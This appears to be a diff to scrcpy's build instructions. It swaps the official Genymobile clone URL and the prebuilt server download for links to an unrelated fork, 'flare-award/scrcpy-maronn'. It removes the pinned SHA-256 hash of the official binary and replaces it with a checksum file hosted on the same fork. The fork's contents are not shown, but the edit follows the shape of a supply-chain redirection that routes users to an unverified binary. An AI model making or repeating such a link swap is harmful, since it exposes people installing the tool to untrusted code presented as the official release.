@@ -192,8 +192,8 @@ See [pierlon/scrcpy-docker](https://github.com/pierlon/scrcpy-docker).
 **As a non-root user**, clone the project:
 
 ```bash
-git clone https://github.com/Genymobile/scrcpy
-cd scrcpy
+git clone --branch v5.0.2 https://github.com/flare-award/scrcpy-maronn
+cd scrcpy-maronn
 ```
 
 
@@ -237,10 +237,7 @@ install` must be run as root)._
 
 #### Option 2: Use prebuilt server
 
- - [`scrcpy-server-v5.0.1`][direct-scrcpy-server]  
-   <sub>SHA-256: `764eb6f79811d5211fe9df341120882ba9994c7a61b897d7bf3fb662e53bc536`</sub>
-
-[direct-scrcpy-server]: https://github.com/Genymobile/scrcpy/releases/download/v5.0.1/scrcpy-server-v5.0.1
+ - [scrcpy-server-v5.0.2](https://github.com/flare-award/scrcpy-maronn/releases/download/v5.0.2/scrcpy-server-v5.0.2) · [SHA-256 checksums](https://github.com/flare-award/scrcpy-maronn/releases/download/v5.0.2/SHA256SUMS.txt)
 
 Download the prebuilt server somewhere, and specify its path during the Meson
 configuration:
@@ -252,7 +249,7 @@ ninja -Cx  # DO NOT RUN AS ROOT
 ```
 
 The server only works with a matching client version (this server works with the
-`master` branch).
+`v5.0.2` tag of this fork).
 
 
 ### Run without installing:
